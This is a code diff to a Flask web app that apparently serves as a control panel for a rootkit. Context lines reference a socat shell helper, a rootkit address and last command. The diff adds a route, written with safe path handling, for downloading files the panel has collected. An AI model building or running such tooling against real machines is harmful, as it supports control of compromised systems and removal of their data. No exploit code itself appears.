@@ -1,6 +1,7 @@
 import binascii
 from utils.socat import run_socat_shell
-from flask import jsonify, request
+from flask import jsonify, request, send_from_directory, abort
+from werkzeug.utils import safe_join
 import config as cfg
 from app import app
 import threading
@@ -53,6 +54,14 @@ def getClientInfos():
         "rootkit_address": [ip, port] if ip and port else None,
         "last_command": last_command,
     }
+
+@app.route('/download_downloaded_file', methods=['GET'])
+def download_downloaded_file():
+    filename = request.args.get('filename', '')
+    path = safe_join(cfg.DOWNLOAD_FOLDER, filename)
+    if not path or not os.path.isfile(path):
+        abort(404)
+    return send_from_directory(cfg.DOWNLOAD_FOLDER, filename, as_attachment=True)
 
 
 @app.route('/client-info', methods=['GET'])
